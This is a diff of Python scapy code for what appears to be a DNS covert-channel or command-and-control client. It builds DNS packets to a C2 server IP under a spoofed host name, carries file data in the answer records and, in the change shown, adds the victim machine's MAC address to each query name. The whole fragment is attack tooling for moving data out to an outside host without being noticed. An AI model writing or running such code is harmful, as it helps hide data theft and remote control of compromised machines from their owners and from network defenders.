@@ -19,7 +19,7 @@ class DataRequest:
     
     def build(self):
         reformatted_filename = "." + self.filename + ("." if self.filename.index('.') == -1 else "")
-        mac_addr = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)).lower() 
+        mac_addr = ''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)).lower() 
 
         ether = Ether(src=mac_addr)
         ip = IP(dst=CC_SERVER_IP)
@@ -29,7 +29,7 @@ class DataRequest:
             opcode=self.type,
             qdcount=PACKET_OPTIONS['DNS']['QDCOUNT'],
             ancount=PACKET_OPTIONS['DNS']['ANCOUNT'],
-            qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST + reformatted_filename, qtype=RequestType.DATA.value, qclass=self.packet_number),
+            qd=DNSQR(qname=mac_addr + '.' + CC_SERVER_SPOOFED_HOST + reformatted_filename, qtype=RequestType.DATA.value, qclass=self.packet_number),
             an=DNSRR(rrname=CC_SERVER_SPOOFED_HOST + reformatted_filename, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata=self.data)
         )
 
